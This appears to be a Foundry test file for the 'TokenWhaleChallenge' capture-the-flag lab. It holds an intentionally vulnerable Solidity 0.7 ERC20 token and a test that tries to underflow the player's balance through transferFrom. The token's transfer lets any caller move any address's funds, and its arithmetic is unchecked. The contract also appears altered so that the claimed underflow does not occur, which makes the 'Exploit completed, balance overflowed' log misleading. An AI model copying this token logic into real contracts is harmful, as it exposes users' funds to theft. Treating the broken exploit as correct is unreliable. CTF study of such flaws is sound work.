// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "lib/forge-std/src/Test.sol";

//==================================================================================
contract ContractTestOverflow21 is Test {
    TokenWhaleChallenge TokenWhaleChallengeContract;
 

function testOverflow2() public {
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    TokenWhaleChallengeContract = new TokenWhaleChallenge();   
    TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
        console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
    TokenWhaleChallengeContract.transfer(address(this),address(alice),800);
        console.log("Player balance2",TokenWhaleChallengeContract.balanceOf(address(this)));
        console.log("Player alice",TokenWhaleChallengeContract.balanceOf(alice));
        console.log("Player bob",TokenWhaleChallengeContract.balanceOf(bob));

    vm.prank(alice);   
    TokenWhaleChallengeContract.approve(address(this),1000);
        console.log("Player balance3",TokenWhaleChallengeContract.balanceOf(address(this)));
        console.log("Player alice",TokenWhaleChallengeContract.balanceOf(alice));
        console.log("Player bob",TokenWhaleChallengeContract.balanceOf(bob));
        
    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),500); //exploit here
        console.log("Player balance4",TokenWhaleChallengeContract.balanceOf(address(this)));
        console.log("Player alice",TokenWhaleChallengeContract.balanceOf(alice));
        console.log("Player bob",TokenWhaleChallengeContract.balanceOf(bob));

        console.log("Exploit completed, balance overflowed");
        console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
    }
    receive() payable external{}
}

//==================================================================================
//==================================================================================

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address from,address to, uint256 value) internal {
        balanceOf[from] -= value;
        balanceOf[to] += value;

        emit Transfer(from, to, value);
    }

    function transfer(address from,address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(from,to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(from,to, value);
    }
}